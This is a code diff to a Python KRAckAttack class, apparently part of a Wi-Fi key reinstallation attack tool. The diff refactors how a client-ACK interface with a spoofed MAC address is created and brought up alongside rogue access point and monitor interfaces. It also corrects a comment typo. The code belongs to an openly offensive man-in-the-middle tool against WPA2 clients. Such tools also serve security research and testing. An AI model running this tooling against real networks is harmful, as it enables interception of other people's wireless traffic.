@@ -428,6 +428,7 @@ class ClientState():
 class KRAckAttack():
 	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
 		self.nic_real = nic_real
+		self.nic_real_clientack = None
 		self.nic_rogue_ap = nic_rogue_ap
 		self.nic_rogue_mon = nic_rogue_mon
 		self.dumpfile = dumpfile
@@ -761,17 +762,16 @@ class KRAckAttack():
 
 		# 3. Configure interface on real channel to ACK frames
 		if self.clientmac:
-				sta_iface = self.nic_real + "sta1"
-				subprocess.check_output(["iw", self.nic_real, "interface", "add", sta_iface, "type", "managed"])
-				call_macchanger(sta_iface, self.clientmac)
-				subprocess.check_output(["ifconfig", sta_iface, "up"])
+				self.nic_real_clientack = self.nic_real + "sta1"
+				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
+				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
 			log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
 			# Sleep for a second to make this warning very explicit
 			time.sleep(1)
 
-		# 4. Finally up the interfaces up
+		# 4. Finally put the interfaces up
 		subprocess.check_output(["ifconfig", self.nic_real, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 
@@ -804,6 +804,9 @@ class KRAckAttack():
 		# Set the MAC address of the rogue hostapd AP
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
+
+		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
+		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# Set BFP filters to increase performance
 		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
